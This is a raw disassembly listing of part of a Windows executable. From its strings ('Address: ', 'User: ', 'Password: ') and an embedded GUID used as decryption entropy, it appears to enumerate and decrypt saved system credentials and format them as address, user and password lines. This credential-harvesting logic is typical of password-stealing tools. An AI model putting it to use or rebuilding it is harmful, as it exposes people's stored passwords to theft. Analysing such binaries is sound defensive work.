  408fb3:	ba 04 00 00 00       	mov    $0x4,%edx
  408fb8:	e8 53 8e ff ff       	call   0x401e10
  408fbd:	ff 75 b4             	push   -0x4c(%ebp)
  408fc0:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  408fc3:	8b 55 cc             	mov    -0x34(%ebp),%edx
  408fc6:	8b 45 d0             	mov    -0x30(%ebp),%eax
  408fc9:	e8 fe fc ff ff       	call   0x408ccc
  408fce:	ff 75 a8             	push   -0x58(%ebp)
  408fd1:	68 e0 92 40 00       	push   $0x4092e0
  408fd6:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  408fd9:	ba 03 00 00 00       	mov    $0x3,%edx
  408fde:	e8 2d 8e ff ff       	call   0x401e10
  408fe3:	43                   	inc    %ebx
  408fe4:	4f                   	dec    %edi
  408fe5:	0f 85 fb fe ff ff    	jne    0x408ee6
  408feb:	8b 55 e8             	mov    -0x18(%ebp),%edx
  408fee:	8b c6                	mov    %esi,%eax
  408ff0:	e8 43 a7 ff ff       	call   0x403738
  408ff5:	ff 45 f4             	incl   -0xc(%ebp)
  408ff8:	6a 00                	push   $0x0
  408ffa:	6a 00                	push   $0x0
  408ffc:	6a 00                	push   $0x0
  408ffe:	6a 00                	push   $0x0
  409000:	8d 45 e8             	lea    -0x18(%ebp),%eax
  409003:	50                   	push   %eax
  409004:	56                   	push   %esi
  409005:	8b 45 f4             	mov    -0xc(%ebp),%eax
  409008:	50                   	push   %eax
  409009:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40900c:	50                   	push   %eax
  40900d:	e8 06 a5 ff ff       	call   0x403518
  409012:	3d 03 01 00 00       	cmp    $0x103,%eax
  409017:	0f 85 ad fe ff ff    	jne    0x408eca
  40901d:	8b 45 ec             	mov    -0x14(%ebp),%eax
  409020:	50                   	push   %eax
  409021:	e8 d2 a4 ff ff       	call   0x4034f8
  409026:	e9 08 02 00 00       	jmp    0x409233
  40902b:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40902e:	50                   	push   %eax
  40902f:	8b 55 b4             	mov    -0x4c(%ebp),%edx
  409032:	b8 e0 92 40 00       	mov    $0x4092e0,%eax
  409037:	e8 f0 8f ff ff       	call   0x40202c
  40903c:	8b c8                	mov    %eax,%ecx
  40903e:	49                   	dec    %ecx
  40903f:	ba 01 00 00 00       	mov    $0x1,%edx
  409044:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  409047:	e8 58 8f ff ff       	call   0x401fa4
  40904c:	8b 55 b4             	mov    -0x4c(%ebp),%edx
  40904f:	b8 e0 92 40 00       	mov    $0x4092e0,%eax
  409054:	e8 d3 8f ff ff       	call   0x40202c
  409059:	8b c8                	mov    %eax,%ecx
  40905b:	41                   	inc    %ecx
  40905c:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  40905f:	ba 01 00 00 00       	mov    $0x1,%edx
  409064:	e8 7b 8f ff ff       	call   0x401fe4
  409069:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40906c:	50                   	push   %eax
  40906d:	8d 45 a0             	lea    -0x60(%ebp),%eax
  409070:	b9 e0 92 40 00       	mov    $0x4092e0,%ecx
  409075:	8b 55 bc             	mov    -0x44(%ebp),%edx
  409078:	e8 1f 8d ff ff       	call   0x401d9c
  40907d:	8b 45 a0             	mov    -0x60(%ebp),%eax
  409080:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  409083:	33 d2                	xor    %edx,%edx
  409085:	e8 a2 c8 ff ff       	call   0x40592c
  40908a:	8b 55 a4             	mov    -0x5c(%ebp),%edx
  40908d:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  409090:	e8 c3 8a ff ff       	call   0x401b58
  409095:	8d 45 9c             	lea    -0x64(%ebp),%eax
  409098:	50                   	push   %eax
  409099:	8b 55 bc             	mov    -0x44(%ebp),%edx
  40909c:	b8 ec 92 40 00       	mov    $0x4092ec,%eax
  4090a1:	e8 86 8f ff ff       	call   0x40202c
  4090a6:	8b c8                	mov    %eax,%ecx
  4090a8:	49                   	dec    %ecx
  4090a9:	ba 01 00 00 00       	mov    $0x1,%edx
  4090ae:	8b 45 bc             	mov    -0x44(%ebp),%eax
  4090b1:	e8 ee 8e ff ff       	call   0x401fa4
  4090b6:	8b 45 9c             	mov    -0x64(%ebp),%eax
  4090b9:	ba f8 92 40 00       	mov    $0x4092f8,%edx
  4090be:	e8 d1 8d ff ff       	call   0x401e94
  4090c3:	0f 85 6a 01 00 00    	jne    0x409233
  4090c9:	8b 55 bc             	mov    -0x44(%ebp),%edx
  4090cc:	b8 08 93 40 00       	mov    $0x409308,%eax
  4090d1:	e8 56 8f ff ff       	call   0x40202c
  4090d6:	8b c8                	mov    %eax,%ecx
  4090d8:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4090db:	ba 01 00 00 00       	mov    $0x1,%edx
  4090e0:	e8 ff 8e ff ff       	call   0x401fe4
  4090e5:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4090e8:	50                   	push   %eax
  4090e9:	8b 55 bc             	mov    -0x44(%ebp),%edx
  4090ec:	b8 d4 92 40 00       	mov    $0x4092d4,%eax
  4090f1:	e8 36 8f ff ff       	call   0x40202c
  4090f6:	8b c8                	mov    %eax,%ecx
  4090f8:	49                   	dec    %ecx
  4090f9:	ba 01 00 00 00       	mov    $0x1,%edx
  4090fe:	8b 45 bc             	mov    -0x44(%ebp),%eax
  409101:	e8 9e 8e ff ff       	call   0x401fa4
  409106:	8b 55 bc             	mov    -0x44(%ebp),%edx
  409109:	b8 d4 92 40 00       	mov    $0x4092d4,%eax
  40910e:	e8 19 8f ff ff       	call   0x40202c
  409113:	8b c8                	mov    %eax,%ecx
  409115:	8d 45 bc             	lea    -0x44(%ebp),%eax
  409118:	ba 01 00 00 00       	mov    $0x1,%edx
  40911d:	e8 c2 8e ff ff       	call   0x401fe4
  409122:	e9 f7 00 00 00       	jmp    0x40921e
  409127:	8b 55 bc             	mov    -0x44(%ebp),%edx
  40912a:	b8 08 93 40 00       	mov    $0x409308,%eax
  40912f:	e8 f8 8e ff ff       	call   0x40202c
  409134:	8b c8                	mov    %eax,%ecx
  409136:	8d 45 bc             	lea    -0x44(%ebp),%eax
  409139:	ba 01 00 00 00       	mov    $0x1,%edx
  40913e:	e8 a1 8e ff ff       	call   0x401fe4
  409143:	ff 75 b8             	push   -0x48(%ebp)
  409146:	ff 75 c0             	push   -0x40(%ebp)
  409149:	68 d4 92 40 00       	push   $0x4092d4
  40914e:	8d 45 98             	lea    -0x68(%ebp),%eax
  409151:	50                   	push   %eax
  409152:	8b 55 bc             	mov    -0x44(%ebp),%edx
  409155:	b8 d4 92 40 00       	mov    $0x4092d4,%eax
  40915a:	e8 cd 8e ff ff       	call   0x40202c
  40915f:	8b c8                	mov    %eax,%ecx
  409161:	49                   	dec    %ecx
  409162:	ba 01 00 00 00       	mov    $0x1,%edx
  409167:	8b 45 bc             	mov    -0x44(%ebp),%eax
  40916a:	e8 35 8e ff ff       	call   0x401fa4
  40916f:	ff 75 98             	push   -0x68(%ebp)
  409172:	68 d4 92 40 00       	push   $0x4092d4
  409177:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40917a:	ba 05 00 00 00       	mov    $0x5,%edx
  40917f:	e8 8c 8c ff ff       	call   0x401e10
  409184:	8b 55 bc             	mov    -0x44(%ebp),%edx
  409187:	b8 d4 92 40 00       	mov    $0x4092d4,%eax
  40918c:	e8 9b 8e ff ff       	call   0x40202c
  409191:	8b c8                	mov    %eax,%ecx
  409193:	8d 45 bc             	lea    -0x44(%ebp),%eax
  409196:	ba 01 00 00 00       	mov    $0x1,%edx
  40919b:	e8 44 8e ff ff       	call   0x401fe4
  4091a0:	8b 55 bc             	mov    -0x44(%ebp),%edx
  4091a3:	b8 08 93 40 00       	mov    $0x409308,%eax
  4091a8:	e8 7f 8e ff ff       	call   0x40202c
  4091ad:	8b c8                	mov    %eax,%ecx
  4091af:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4091b2:	ba 01 00 00 00       	mov    $0x1,%edx
  4091b7:	e8 28 8e ff ff       	call   0x401fe4
  4091bc:	ff 75 b8             	push   -0x48(%ebp)
  4091bf:	8d 45 94             	lea    -0x6c(%ebp),%eax
  4091c2:	50                   	push   %eax
  4091c3:	8b 55 bc             	mov    -0x44(%ebp),%edx
  4091c6:	b8 d4 92 40 00       	mov    $0x4092d4,%eax
  4091cb:	e8 5c 8e ff ff       	call   0x40202c
  4091d0:	8b c8                	mov    %eax,%ecx
  4091d2:	49                   	dec    %ecx
  4091d3:	ba 01 00 00 00       	mov    $0x1,%edx
  4091d8:	8b 45 bc             	mov    -0x44(%ebp),%eax
  4091db:	e8 c4 8d ff ff       	call   0x401fa4
  4091e0:	ff 75 94             	push   -0x6c(%ebp)
  4091e3:	68 d4 92 40 00       	push   $0x4092d4
  4091e8:	8d 45 b8             	lea    -0x48(%ebp),%eax
  4091eb:	ba 03 00 00 00       	mov    $0x3,%edx
  4091f0:	e8 1b 8c ff ff       	call   0x401e10
  4091f5:	8b 55 bc             	mov    -0x44(%ebp),%edx
  4091f8:	b8 d4 92 40 00       	mov    $0x4092d4,%eax
  4091fd:	e8 2a 8e ff ff       	call   0x40202c
  409202:	8b c8                	mov    %eax,%ecx
  409204:	8d 45 bc             	lea    -0x44(%ebp),%eax
  409207:	ba 01 00 00 00       	mov    $0x1,%edx
  40920c:	e8 d3 8d ff ff       	call   0x401fe4
  409211:	8d 45 b8             	lea    -0x48(%ebp),%eax
  409214:	ba e0 92 40 00       	mov    $0x4092e0,%edx
  409219:	e8 3a 8b ff ff       	call   0x401d58
  40921e:	8b 55 bc             	mov    -0x44(%ebp),%edx
  409221:	b8 d4 92 40 00       	mov    $0x4092d4,%eax
  409226:	e8 01 8e ff ff       	call   0x40202c
  40922b:	85 c0                	test   %eax,%eax
  40922d:	0f 8f f4 fe ff ff    	jg     0x409127
  409233:	8b 55 b4             	mov    -0x4c(%ebp),%edx
  409236:	b8 e0 92 40 00       	mov    $0x4092e0,%eax
  40923b:	e8 ec 8d ff ff       	call   0x40202c
  409240:	85 c0                	test   %eax,%eax
  409242:	0f 8f e3 fd ff ff    	jg     0x40902b
  409248:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40924b:	8b 55 b8             	mov    -0x48(%ebp),%edx
  40924e:	e8 c1 88 ff ff       	call   0x401b14
  409253:	33 c0                	xor    %eax,%eax
  409255:	5a                   	pop    %edx
  409256:	59                   	pop    %ecx
  409257:	59                   	pop    %ecx
  409258:	64 89 10             	mov    %edx,%fs:(%eax)
  40925b:	68 ae 92 40 00       	push   $0x4092ae
  409260:	8d 45 94             	lea    -0x6c(%ebp),%eax
  409263:	ba 07 00 00 00       	mov    $0x7,%edx
  409268:	e8 77 88 ff ff       	call   0x401ae4
  40926d:	8d 45 b0             	lea    -0x50(%ebp),%eax
  409270:	e8 93 8e ff ff       	call   0x402108
  409275:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  409278:	ba 04 00 00 00       	mov    $0x4,%edx
  40927d:	e8 62 88 ff ff       	call   0x401ae4
  409282:	8d 45 dc             	lea    -0x24(%ebp),%eax
  409285:	8b 15 34 8e 40 00    	mov    0x408e34,%edx
  40928b:	e8 38 9d ff ff       	call   0x402fc8
  409290:	8d 45 f0             	lea    -0x10(%ebp),%eax
  409293:	e8 28 88 ff ff       	call   0x401ac0
  409298:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40929b:	8b 15 30 87 40 00    	mov    0x408730,%edx
  4092a1:	e8 22 9d ff ff       	call   0x402fc8
  4092a6:	c3                   	ret
  4092a7:	e9 60 85 ff ff       	jmp    0x40180c
  4092ac:	eb b2                	jmp    0x409260
  4092ae:	5f                   	pop    %edi
  4092af:	5e                   	pop    %esi
  4092b0:	5b                   	pop    %ebx
  4092b1:	8b e5                	mov    %ebp,%esp
  4092b3:	5d                   	pop    %ebp
  4092b4:	c3                   	ret
  4092b5:	00 00                	add    %al,(%eax)
  4092b7:	00 ff                	add    %bh,%bh
  4092b9:	ff                   	(bad)
  4092ba:	ff                   	(bad)
  4092bb:	ff 09                	decl   (%ecx)
  4092bd:	00 00                	add    %al,(%eax)
  4092bf:	00 41 64             	add    %al,0x64(%ecx)
  4092c2:	64 72 65             	fs jb  0x40932a
  4092c5:	73 73                	jae    0x40933a
  4092c7:	3a 20                	cmp    (%eax),%ah
  4092c9:	00 00                	add    %al,(%eax)
  4092cb:	00 ff                	add    %bh,%bh
  4092cd:	ff                   	(bad)
  4092ce:	ff                   	(bad)
  4092cf:	ff 01                	incl   (%ecx)
  4092d1:	00 00                	add    %al,(%eax)
  4092d3:	00 7c 00 00          	add    %bh,0x0(%eax,%eax,1)
  4092d7:	00 ff                	add    %bh,%bh
  4092d9:	ff                   	(bad)
  4092da:	ff                   	(bad)
  4092db:	ff 02                	incl   (%edx)
  4092dd:	00 00                	add    %al,(%eax)
  4092df:	00 0d 0a 00 00 ff    	add    %cl,0xff00000a
  4092e5:	ff                   	(bad)
  4092e6:	ff                   	(bad)
  4092e7:	ff 01                	incl   (%ecx)
  4092e9:	00 00                	add    %al,(%eax)
  4092eb:	00 3a                	add    %bh,(%edx)
  4092ed:	00 00                	add    %al,(%eax)
  4092ef:	00 ff                	add    %bh,%bh
  4092f1:	ff                   	(bad)
  4092f2:	ff                   	(bad)
  4092f3:	ff 07                	incl   (%edi)
  4092f5:	00 00                	add    %al,(%eax)
  4092f7:	00 41 64             	add    %al,0x64(%ecx)
  4092fa:	64 72 65             	fs jb  0x409362
  4092fd:	73 73                	jae    0x409372
  4092ff:	00 ff                	add    %bh,%bh
  409301:	ff                   	(bad)
  409302:	ff                   	(bad)
  409303:	ff 01                	incl   (%ecx)
  409305:	00 00                	add    %al,(%eax)
  409307:	00 20                	add    %ah,(%eax)
  409309:	00 00                	add    %al,(%eax)
  40930b:	00 55 8b             	add    %dl,-0x75(%ebp)
  40930e:	ec                   	in     (%dx),%al
  40930f:	b9 1b 00 00 00       	mov    $0x1b,%ecx
  409314:	6a 00                	push   $0x0
  409316:	6a 00                	push   $0x0
  409318:	49                   	dec    %ecx
  409319:	75 f9                	jne    0x409314
  40931b:	51                   	push   %ecx
  40931c:	53                   	push   %ebx
  40931d:	56                   	push   %esi
  40931e:	57                   	push   %edi
  40931f:	8b f0                	mov    %eax,%esi
  409321:	33 c0                	xor    %eax,%eax
  409323:	55                   	push   %ebp
  409324:	68 51 96 40 00       	push   $0x409651
  409329:	64 ff 30             	push   %fs:(%eax)
  40932c:	64 89 20             	mov    %esp,%fs:(%eax)
  40932f:	8b c6                	mov    %esi,%eax
  409331:	e8 8a 87 ff ff       	call   0x401ac0
  409336:	56                   	push   %esi
  409337:	be 60 96 40 00       	mov    $0x409660,%esi
  40933c:	8d bd 6d ff ff ff    	lea    -0x93(%ebp),%edi
  409342:	b9 09 00 00 00       	mov    $0x9,%ecx
  409347:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  409349:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40934a:	5e                   	pop    %esi
  40934b:	bf 25 00 00 00       	mov    $0x25,%edi
  409350:	8d 85 6d ff ff ff    	lea    -0x93(%ebp),%eax
  409356:	8d 55 92             	lea    -0x6e(%ebp),%edx
  409359:	33 c9                	xor    %ecx,%ecx
  40935b:	8a 08                	mov    (%eax),%cl
  40935d:	c1 e1 02             	shl    $0x2,%ecx
  409360:	66 89 0a             	mov    %cx,(%edx)
  409363:	83 c2 02             	add    $0x2,%edx
  409366:	40                   	inc    %eax
  409367:	4f                   	dec    %edi
  409368:	75 ef                	jne    0x409359
  40936a:	8d 45 92             	lea    -0x6e(%ebp),%eax
  40936d:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  409370:	c7 45 e0 4a 00 00 00 	movl   $0x4a,-0x20(%ebp)
  409377:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40937a:	50                   	push   %eax
  40937b:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40937e:	50                   	push   %eax
  40937f:	6a 00                	push   $0x0
  409381:	6a 00                	push   $0x0
  409383:	e8 60 f3 ff ff       	call   0x4086e8
  409388:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40938b:	48                   	dec    %eax
  40938c:	85 c0                	test   %eax,%eax
  40938e:	0f 8c da 01 00 00    	jl     0x40956e
  409394:	40                   	inc    %eax
  409395:	89 45 dc             	mov    %eax,-0x24(%ebp)
  409398:	33 ff                	xor    %edi,%edi
  40939a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40939d:	8b 04 b8             	mov    (%eax,%edi,4),%eax
  4093a0:	8b 50 1c             	mov    0x1c(%eax),%edx
  4093a3:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4093a6:	8b 40 18             	mov    0x18(%eax),%eax
  4093a9:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4093ac:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4093af:	50                   	push   %eax
  4093b0:	6a 00                	push   $0x0
  4093b2:	6a 00                	push   $0x0
  4093b4:	6a 00                	push   $0x0
  4093b6:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4093b9:	50                   	push   %eax
  4093ba:	6a 00                	push   $0x0
  4093bc:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4093bf:	50                   	push   %eax
  4093c0:	e8 2b f3 ff ff       	call   0x4086f0
  4093c5:	ff 36                	push   (%esi)
  4093c7:	68 90 96 40 00       	push   $0x409690
  4093cc:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
  4093d2:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4093d5:	8b 14 ba             	mov    (%edx,%edi,4),%edx
  4093d8:	8b 52 08             	mov    0x8(%edx),%edx
  4093db:	e8 cc 88 ff ff       	call   0x401cac
  4093e0:	ff b5 68 ff ff ff    	push   -0x98(%ebp)
  4093e6:	68 a4 96 40 00       	push   $0x4096a4
  4093eb:	8b c6                	mov    %esi,%eax
  4093ed:	ba 04 00 00 00       	mov    $0x4,%edx
  4093f2:	e8 19 8a ff ff       	call   0x401e10
  4093f7:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4093fa:	e8 75 7d ff ff       	call   0x401174
  4093ff:	8b 5d ec             	mov    -0x14(%ebp),%ebx
  409402:	8b 16                	mov    (%esi),%edx
  409404:	8d 85 5c ff ff ff    	lea    -0xa4(%ebp),%eax
  40940a:	b9 b0 96 40 00       	mov    $0x4096b0,%ecx
  40940f:	e8 88 89 ff ff       	call   0x401d9c
  409414:	8b 95 5c ff ff ff    	mov    -0xa4(%ebp),%edx
  40941a:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  409420:	e8 2f 8e ff ff       	call   0x402254
  409425:	ff b5 60 ff ff ff    	push   -0xa0(%ebp)
  40942b:	8d 85 58 ff ff ff    	lea    -0xa8(%ebp),%eax
  409431:	50                   	push   %eax
  409432:	8d 85 54 ff ff ff    	lea    -0xac(%ebp),%eax
  409438:	8b d3                	mov    %ebx,%edx
  40943a:	e8 d9 8d ff ff       	call   0x402218
  40943f:	8b 95 54 ff ff ff    	mov    -0xac(%ebp),%edx
  409445:	b8 bc 96 40 00       	mov    $0x4096bc,%eax
  40944a:	e8 49 8f ff ff       	call   0x402398
  40944f:	48                   	dec    %eax
  409450:	50                   	push   %eax
  409451:	8d 85 50 ff ff ff    	lea    -0xb0(%ebp),%eax
  409457:	8b d3                	mov    %ebx,%edx
  409459:	e8 ba 8d ff ff       	call   0x402218
  40945e:	8b 85 50 ff ff ff    	mov    -0xb0(%ebp),%eax
  409464:	33 d2                	xor    %edx,%edx
  409466:	59                   	pop    %ecx
  409467:	e8 e0 8e ff ff       	call   0x40234c
  40946c:	ff b5 58 ff ff ff    	push   -0xa8(%ebp)
  409472:	68 c4 96 40 00       	push   $0x4096c4
  409477:	8d 85 64 ff ff ff    	lea    -0x9c(%ebp),%eax
  40947d:	ba 03 00 00 00       	mov    $0x3,%edx
  409482:	e8 f9 8d ff ff       	call   0x402280
  409487:	8b 95 64 ff ff ff    	mov    -0x9c(%ebp),%edx
  40948d:	8b c6                	mov    %esi,%eax
  40948f:	e8 a8 88 ff ff       	call   0x401d3c
  409494:	8b 16                	mov    (%esi),%edx
  409496:	8d 85 44 ff ff ff    	lea    -0xbc(%ebp),%eax
  40949c:	b9 d4 96 40 00       	mov    $0x4096d4,%ecx
  4094a1:	e8 f6 88 ff ff       	call   0x401d9c
  4094a6:	8b 95 44 ff ff ff    	mov    -0xbc(%ebp),%edx
  4094ac:	8d 85 48 ff ff ff    	lea    -0xb8(%ebp),%eax
  4094b2:	e8 9d 8d ff ff       	call   0x402254
  4094b7:	ff b5 48 ff ff ff    	push   -0xb8(%ebp)
  4094bd:	8d 85 40 ff ff ff    	lea    -0xc0(%ebp),%eax
  4094c3:	50                   	push   %eax
  4094c4:	8d 85 3c ff ff ff    	lea    -0xc4(%ebp),%eax
  4094ca:	8b d3                	mov    %ebx,%edx
  4094cc:	e8 47 8d ff ff       	call   0x402218
  4094d1:	8b 95 3c ff ff ff    	mov    -0xc4(%ebp),%edx
  4094d7:	b8 bc 96 40 00       	mov    $0x4096bc,%eax
  4094dc:	e8 b7 8e ff ff       	call   0x402398
  4094e1:	50                   	push   %eax
  4094e2:	8d 85 38 ff ff ff    	lea    -0xc8(%ebp),%eax
  4094e8:	8b d3                	mov    %ebx,%edx
  4094ea:	e8 29 8d ff ff       	call   0x402218
  4094ef:	8b 85 38 ff ff ff    	mov    -0xc8(%ebp),%eax
  4094f5:	e8 7a 8d ff ff       	call   0x402274
  4094fa:	5a                   	pop    %edx
  4094fb:	2b c2                	sub    %edx,%eax
  4094fd:	50                   	push   %eax
  4094fe:	8d 85 34 ff ff ff    	lea    -0xcc(%ebp),%eax
  409504:	8b d3                	mov    %ebx,%edx
  409506:	e8 0d 8d ff ff       	call   0x402218
  40950b:	8b 95 34 ff ff ff    	mov    -0xcc(%ebp),%edx
  409511:	b8 bc 96 40 00       	mov    $0x4096bc,%eax
  409516:	e8 7d 8e ff ff       	call   0x402398
  40951b:	40                   	inc    %eax
  40951c:	50                   	push   %eax
  40951d:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  409523:	8b d3                	mov    %ebx,%edx
  409525:	e8 ee 8c ff ff       	call   0x402218
  40952a:	8b 85 30 ff ff ff    	mov    -0xd0(%ebp),%eax
  409530:	5a                   	pop    %edx
  409531:	59                   	pop    %ecx
  409532:	e8 15 8e ff ff       	call   0x40234c
  409537:	ff b5 40 ff ff ff    	push   -0xc0(%ebp)
  40953d:	68 c4 96 40 00       	push   $0x4096c4
  409542:	68 e4 96 40 00       	push   $0x4096e4
  409547:	8d 85 4c ff ff ff    	lea    -0xb4(%ebp),%eax
  40954d:	ba 04 00 00 00       	mov    $0x4,%edx
  409552:	e8 29 8d ff ff       	call   0x402280
  409557:	8b 95 4c ff ff ff    	mov    -0xb4(%ebp),%edx
  40955d:	8b c6                	mov    %esi,%eax
  40955f:	e8 d8 87 ff ff       	call   0x401d3c
  409564:	47                   	inc    %edi
  409565:	ff 4d dc             	decl   -0x24(%ebp)
  409568:	0f 85 2c fe ff ff    	jne    0x40939a
  40956e:	8d 85 2c ff ff ff    	lea    -0xd4(%ebp),%eax
  409574:	50                   	push   %eax
  409575:	8b 0e                	mov    (%esi),%ecx
  409577:	33 d2                	xor    %edx,%edx
  409579:	b8 90 96 40 00       	mov    $0x409690,%eax
  40957e:	e8 a9 c3 ff ff       	call   0x40592c
  409583:	8b 95 2c ff ff ff    	mov    -0xd4(%ebp),%edx
  409589:	8b c6                	mov    %esi,%eax
  40958b:	e8 84 85 ff ff       	call   0x401b14
  409590:	8d 85 28 ff ff ff    	lea    -0xd8(%ebp),%eax
  409596:	50                   	push   %eax
  409597:	8b 0e                	mov    (%esi),%ecx
  409599:	33 d2                	xor    %edx,%edx
  40959b:	b8 b0 96 40 00       	mov    $0x4096b0,%eax
  4095a0:	e8 87 c3 ff ff       	call   0x40592c
  4095a5:	8b 95 28 ff ff ff    	mov    -0xd8(%ebp),%edx
  4095ab:	8b c6                	mov    %esi,%eax
  4095ad:	e8 62 85 ff ff       	call   0x401b14
  4095b2:	8d 85 24 ff ff ff    	lea    -0xdc(%ebp),%eax
  4095b8:	50                   	push   %eax
  4095b9:	8b 0e                	mov    (%esi),%ecx
  4095bb:	33 d2                	xor    %edx,%edx
  4095bd:	b8 d4 96 40 00       	mov    $0x4096d4,%eax
  4095c2:	e8 65 c3 ff ff       	call   0x40592c
  4095c7:	8b 95 24 ff ff ff    	mov    -0xdc(%ebp),%edx
  4095cd:	8b c6                	mov    %esi,%eax
  4095cf:	e8 40 85 ff ff       	call   0x401b14
  4095d4:	33 c0                	xor    %eax,%eax
  4095d6:	5a                   	pop    %edx
  4095d7:	59                   	pop    %ecx
  4095d8:	59                   	pop    %ecx
  4095d9:	64 89 10             	mov    %edx,%fs:(%eax)
  4095dc:	68 58 96 40 00       	push   $0x409658
  4095e1:	8d 85 24 ff ff ff    	lea    -0xdc(%ebp),%eax
  4095e7:	ba 03 00 00 00       	mov    $0x3,%edx
  4095ec:	e8 f3 84 ff ff       	call   0x401ae4
  4095f1:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  4095f7:	ba 05 00 00 00       	mov    $0x5,%edx
  4095fc:	e8 1f 8b ff ff       	call   0x402120
  409601:	8d 85 44 ff ff ff    	lea    -0xbc(%ebp),%eax
  409607:	e8 b4 84 ff ff       	call   0x401ac0
  40960c:	8d 85 48 ff ff ff    	lea    -0xb8(%ebp),%eax
  409612:	ba 05 00 00 00       	mov    $0x5,%edx
  409617:	e8 04 8b ff ff       	call   0x402120
  40961c:	8d 85 5c ff ff ff    	lea    -0xa4(%ebp),%eax
  409622:	e8 99 84 ff ff       	call   0x401ac0
  409627:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  40962d:	ba 02 00 00 00       	mov    $0x2,%edx
  409632:	e8 e9 8a ff ff       	call   0x402120
  409637:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
  40963d:	e8 7e 84 ff ff       	call   0x401ac0
  409642:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409645:	8b 15 bc 86 40 00    	mov    0x4086bc,%edx
  40964b:	e8 78 99 ff ff       	call   0x402fc8
  409650:	c3                   	ret
  409651:	e9 b6 81 ff ff       	jmp    0x40180c
  409656:	eb 89                	jmp    0x4095e1
  409658:	5f                   	pop    %edi
  409659:	5e                   	pop    %esi
  40965a:	5b                   	pop    %ebx
  40965b:	8b e5                	mov    %ebp,%esp
  40965d:	5d                   	pop    %ebp
  40965e:	c3                   	ret
  40965f:	00 61 62             	add    %ah,0x62(%ecx)
  409662:	65 32 38             	xor    %gs:(%eax),%bh
  409665:	36 39 66 2d          	cmp    %esp,%ss:0x2d(%esi)
  409669:	39 62 34             	cmp    %esp,0x34(%edx)
  40966c:	37                   	aaa
  40966d:	2d 34 63 64 39       	sub    $0x39646334,%eax
  409672:	2d 61 33 35 38       	sub    $0x38353361,%eax
  409677:	2d 63 32 32 39       	sub    $0x39323263,%eax
  40967c:	30 34 64             	xor    %dh,(%esp,%eiz,2)
  40967f:	62 61 37             	bound  %esp,0x37(%ecx)
  409682:	66 37                	data16 aaa
  409684:	00 00                	add    %al,(%eax)
  409686:	00 00                	add    %al,(%eax)
  409688:	ff                   	(bad)
  409689:	ff                   	(bad)
  40968a:	ff                   	(bad)
  40968b:	ff 09                	decl   (%ecx)
  40968d:	00 00                	add    %al,(%eax)
  40968f:	00 41 64             	add    %al,0x64(%ecx)
  409692:	64 72 65             	fs jb  0x4096fa
  409695:	73 73                	jae    0x40970a
  409697:	3a 20                	cmp    (%eax),%ah
  409699:	00 00                	add    %al,(%eax)
  40969b:	00 ff                	add    %bh,%bh
  40969d:	ff                   	(bad)
  40969e:	ff                   	(bad)
  40969f:	ff 02                	incl   (%edx)
  4096a1:	00 00                	add    %al,(%eax)
  4096a3:	00 20                	add    %ah,(%eax)
  4096a5:	7c 00                	jl     0x4096a7
  4096a7:	00 ff                	add    %bh,%bh
  4096a9:	ff                   	(bad)
  4096aa:	ff                   	(bad)
  4096ab:	ff 06                	incl   (%esi)
  4096ad:	00 00                	add    %al,(%eax)
  4096af:	00 55 73             	add    %dl,0x73(%ebp)
  4096b2:	65 72 3a             	gs jb  0x4096ef
  4096b5:	20 00                	and    %al,(%eax)
  4096b7:	00 02                	add    %al,(%edx)
  4096b9:	00 00                	add    %al,(%eax)
  4096bb:	00 3a                	add    %bh,(%edx)
  4096bd:	00 00                	add    %al,(%eax)
  4096bf:	00 04 00             	add    %al,(%eax,%eax,1)
  4096c2:	00 00                	add    %al,(%eax)
  4096c4:	20 00                	and    %al,(%eax)
  4096c6:	7c 00                	jl     0x4096c8
  4096c8:	00 00                	add    %al,(%eax)
  4096ca:	00 00                	add    %al,(%eax)
  4096cc:	ff                   	(bad)
  4096cd:	ff                   	(bad)
  4096ce:	ff                   	(bad)
  4096cf:	ff 0a                	decl   (%edx)
  4096d1:	00 00                	add    %al,(%eax)
  4096d3:	00 50 61             	add    %dl,0x61(%eax)
  4096d6:	73 73                	jae    0x40974b
  4096d8:	77 6f                	ja     0x409749
  4096da:	72 64                	jb     0x409740
  4096dc:	3a 20                	cmp    (%eax),%ah
  4096de:	00 00                	add    %al,(%eax)
  4096e0:	04 00                	add    $0x0,%al
  4096e2:	00 00                	add    %al,(%eax)
  4096e4:	0d 00 0a 00 00       	or     $0xa00,%eax
  4096e9:	00 00                	add    %al,(%eax)
  4096eb:	00 55 8b             	add    %dl,-0x75(%ebp)
  4096ee:	ec                   	in     (%dx),%al
  4096ef:	6a 00                	push   $0x0
  4096f1:	53                   	push   %ebx
